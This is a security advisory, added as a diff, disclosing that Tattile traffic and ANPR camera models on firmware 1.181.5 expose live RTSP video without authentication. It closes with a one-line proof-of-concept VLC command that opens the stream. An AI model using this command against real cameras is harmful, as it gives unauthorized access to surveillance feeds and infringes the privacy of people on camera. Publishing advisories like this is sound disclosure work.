@@ -1,0 +1,53 @@
+
+Tattile Cameras 1.181.5 Unauthenticated RTSP Stream Disclosure
+
+
+Vendor: Tattile s.r.l.
+Product web page: https://www.tattile.com
+Affected version: Smart+ family: Smart+
+                                 Tolling+
+                                 Smart+ Speed
+                                 Smart+ Traffic Light
+                  Vega family: Axle Counter
+                               Vega 53
+                               Vega33 & Vega 11
+                  Basic family: Basic MK2
+                                ANPR Mobile
+                  Firmware: 1.181.5
+
+Summary: Tattile is an Italian manufacturer specializing in advanced
+ANPR/ALPR, traffic‑enforcement, and machine‑vision camera systems used
+across intelligent transportation networks, tolling infrastructures,
+access‑control environments, and industrial automation. Their portfolio
+includes high‑performance ITS cameras capable of vehicle identification,
+speed and red‑light enforcement, free‑flow tolling, and multi‑lane traffic
+monitoring, as well as compact ANPR units for parking and perimeter control,
+and industrial smart cameras for inspection and quality assurance. Across
+all model families, Tattile devices combine ruggedized hardware with onboard
+image processing, AI‑based vehicle analytics, and high‑sensitivity sensors
+designed for continuous operation in demanding outdoor conditions, making
+them critical components in modern traffic management and enforcement
+architectures.
+
+Desc: The Tattile cameras suffer from an unauthenticated and unauthorized
+live RTSP video stream access.
+
+Tested on: lighttpd/1.4.64
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5978
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2026-5978.php
+CVE ID: CVE-2026-26340
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2026-26340
+
+
+22.01.2026
+
+--
+
+
+$ vlc rtsp://cameraIP:554/default
